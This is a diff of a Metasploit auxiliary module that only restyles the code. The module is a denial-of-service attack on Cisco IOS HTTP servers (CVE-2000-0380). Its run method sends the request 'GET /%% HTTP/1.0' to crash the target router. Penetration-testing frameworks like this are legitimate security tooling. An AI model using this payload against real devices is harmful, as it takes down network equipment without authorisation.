@@ -8,37 +8,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Cisco IOS HTTP GET /%% Request Denial of Service',
-      'Description'    => %q{
-        This module triggers a Denial of Service condition in the Cisco IOS
-        HTTP server. By sending a GET request for "/%%", the device becomes
-        unresponsive. IOS 11.1 -> 12.1 are reportedly vulnerable. This module
-        tested successfully against a Cisco 1600 Router IOS v11.2(18)P.
-      },
-      'Author' 		=> [ 'aushack' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Cisco IOS HTTP GET /%% Request Denial of Service',
+        'Description' => %q{
+          This module triggers a Denial of Service condition in the Cisco IOS
+          HTTP server. By sending a GET request for "/%%", the device becomes
+          unresponsive. IOS 11.1 -> 12.1 are reportedly vulnerable. This module
+          tested successfully against a Cisco 1600 Router IOS v11.2(18)P.
+        },
+        'Author' => [ 'aushack' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'BID', '1154'],
           [ 'CVE', '2000-0380'],
           [ 'OSVDB', '1302' ],
         ],
-      'DisclosureDate' => '2000-04-26'))
+        'DisclosureDate' => '2000-04-26',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
-    register_options(
-      [
-        Opt::RPORT(80),
-      ])
-
+    register_options([
+      Opt::RPORT(80),
+    ])
   end
 
   def run
     connect
 
-    print_status("Sending HTTP DoS packet")
+    print_status('Sending HTTP DoS packet')
 
-    sploit = "GET /%% HTTP/1.0"
+    sploit = 'GET /%% HTTP/1.0'
     sock.put(sploit + "\r\n")
 
     disconnect
